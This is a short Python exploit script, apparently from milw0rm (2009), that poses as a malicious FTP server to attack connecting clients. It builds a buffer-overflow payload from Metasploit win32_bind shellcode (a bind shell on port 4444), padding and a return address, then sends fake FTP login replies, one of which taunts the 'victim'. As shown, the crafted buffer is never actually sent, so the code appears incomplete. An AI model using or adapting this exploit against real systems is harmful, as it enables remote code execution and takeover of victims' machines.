#!/usr/bin/python
from payload import buf
import socket
import time


def shell_attack(target_machine, target_port):

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
    stage1 = buf  
  
  
    buffer =  stage1 #<---------------------------------|
    buffer += b'\x41'*(412-len(stage1)) #		    |
    buffer += b'\xC5\xB3\x43\x00'	# add esp,8;retn----|


    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((target_machine, target_port))
    s.listen(1)
    c, addr = s.accept()
    c.send(b"220 Hey victim batet fik!\r\n")
    c.recv(1024)
    time.sleep(0.5)
    c.send(b"331 User anonymous OK Password required\r\n")
    c.recv(1024)
    time.sleep(0.5)
    c.send(b"230 Ok.\r\n")
    c.recv(1024)  
    c.close()
   

    # milw0rm.com [2009-09-09]